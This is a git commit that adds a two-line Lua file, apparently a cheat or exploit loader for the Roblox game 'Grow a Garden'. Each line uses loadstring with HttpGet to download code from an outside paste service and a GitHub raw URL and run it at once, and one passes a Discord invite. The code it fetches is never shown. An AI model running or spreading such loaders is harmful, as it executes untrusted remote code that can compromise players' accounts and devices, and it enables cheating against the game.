8970e71f4acb10a4779a91d5fbdfac19a2abc0af
growagardenhelp <yhandycar@gmail.com>
2025-07-22 17:31:26 +0800

    Create Reverse_Scripts_E.lua

---
+++ Reverse_Scripts_E.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/XPbFORYrg2ufvQmi/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
